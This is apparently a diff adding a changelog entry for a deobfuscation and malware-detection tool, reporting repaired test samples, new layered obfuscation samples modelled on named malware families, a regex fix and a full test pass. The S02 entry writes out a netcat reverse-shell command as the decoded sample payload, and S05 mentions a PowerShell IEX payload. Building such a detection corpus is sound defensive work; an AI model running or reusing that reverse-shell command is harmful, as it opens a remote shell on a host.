@@ -2,6 +2,54 @@
 
 Chronological record of significant releases (newest first).
 
+## 2026-08-02 · Phase 5.5 · M9 Corpus Repair + Expansion — COMPLETE · DCS 100%
+
+**Ships:**
+- **S02 REPAIRED** — new pipeline built against `nc 10.10.10.42 4444
+  -e /bin/bash`. Every stage `rev | base64 -d | xxd -r -p` now
+  decodes cleanly (forensic evidence for original defect retained).
+- **S05 REPAIRED** — new gzip payload with correct CRC/size,
+  decompressing to `Write-Host "Hello, malicious world!"; IEX ...`.
+- **4 new real-world layered samples**:
+    - `S014_cs_beacon_downloadcradle` — Cobalt Strike / Empire /
+      Nishang DownloadCradle.
+    - `S015_ps_multi_stage_env_alias` — GootLoader / Bumblebee
+      env-slice + concat + alias chain.
+    - `S016_cmd_carets_to_ps_enc` — Emotet / QakBot CMD → PS handoff.
+    - `S017_hex_b64_utf16le_chain` — deep Hex → Base64 → UTF-16LE.
+- **Bug fix** in `semantic-ps-variable-propagate` — was silently
+  matching `$W='http'` from `$W='http'+'s'` (regex stopped at the
+  first closing quote and returned partial RHS, dropping concat
+  operands). Added negative lookahead `(?!\s*[+])` so propagation
+  waits for structural concat-fold to fully resolve the RHS first.
+- All 17 fingerprints regenerated; `--strict` mode confirms
+  17/17 samples byte-identical.
+- **218/218 tests · 0 regressions · `/api/health` = 200.**
+
+**DCS milestone: 100% (17/17)** — the certification corpus reaches
+full pass for the first time.
+
+Per-category:
+- **PowerShell** 9/9
+- **CMD** 2/2
+- **Bash** 3/3
+- **Mixed** 3/3
+
+**DCS journey:**
+
+    Pre-recovery      : 38.5% (5/13)
+    After M4          : 76.9% (10/13)
+    After M5          : 84.6% (11/13)
+    After M9          : 100.0% (17/17)   ← now
+
+**Next milestone:** M10 · Workspace Isolation Certificate
+(governance) → **Phase R** — real-world coverage volume program
+across Cobalt Strike, GootLoader, Emotet, IcedID, BumbleBee,
+QakBot, AsyncRAT, DarkGate, SocGholish, NetSupport, Lumma, Akira,
+Raspberry Robin, LOLBAS, and beyond.
+
+---
+
 ## 2026-08-02 · Phase 5.5 · M8 Corpus Fingerprint Fields — COMPLETE
 
 **Ships:**
